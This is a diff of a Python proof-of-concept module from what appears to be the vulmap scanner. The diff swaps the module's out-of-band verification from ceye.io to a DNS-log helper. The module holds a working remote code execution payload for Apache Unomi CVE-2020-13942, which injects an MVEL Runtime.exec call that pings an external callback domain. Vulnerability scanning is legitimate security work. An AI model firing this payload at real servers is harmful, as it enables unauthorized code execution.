@@ -1,27 +1,24 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import json
-import requests
+from thirdparty import requests
 import threading
 from module import globals
 from core.verify import verify
-from module.md5 import random_md5
-from requests.packages import urllib3
-from requests_toolbelt.utils import dump
-urllib3.disable_warnings()
+from thirdparty.requests_toolbelt.utils import dump
+from module.api.dns import dns_result, dns_request
 
 
 class ApacheUnomi():
     def __init__(self, url):
         self.url = url
+        if self.url[-1] == "/":
+            self.url = self.url[:-1]
         self.raw_data = None
         self.vul_info = {}
         self.ua = globals.get_value("UA")  # 获取全局变量UA
         self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
         self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
-        self.ceye_domain = globals.get_value("ceye_domain")
-        self.ceye_token = globals.get_value("ceye_token")
-        self.ceye_api = globals.get_value("ceye_api")
         self.threadLock = threading.Lock()
         self.payload_cve_2020_13942 = '''{ "filters": [ { "id": "myfilter1_anystr", "filters": [ { "condition": {''' \
                                       '''"parameterValues": {  "": "script::Runtime r = Runtime.getRuntime(); ''' \
@@ -48,7 +45,7 @@ class ApacheUnomi():
                                     "攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。"
         self.vul_info["cre_date"] = "2021-01-28"
         self.vul_info["cre_auth"] = "zhzyker"
-        md = random_md5()
+        md = dns_request()
         cmd = "ping " + md
         self.payload = self.payload_cve_2020_13942.replace("RECOMMAND", cmd)
         self.headers = {
@@ -60,11 +57,10 @@ class ApacheUnomi():
         try:
             req = requests.post(self.url + "/context.json", data=self.payload, headers=self.headers,
                                          timeout=self.timeout, verify=False)
-            request = requests.get(self.ceye_api + self.ceye_token)
-            if md in request.text:
+            if dns_result(md):
                 self.vul_info["vul_data"] = dump.dump_all(req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                self.vul_info["prt_info"] = "[ceye] [cmd:" + cmd + "]"
+                self.vul_info["prt_info"] = "[dns] [cmd:" + cmd + "]"
             else:
                 rep = list(json.loads(req.text)["trackedConditions"])[0]["parameterValues"]["pagePath"]
                 if r"/tracker/" in rep:
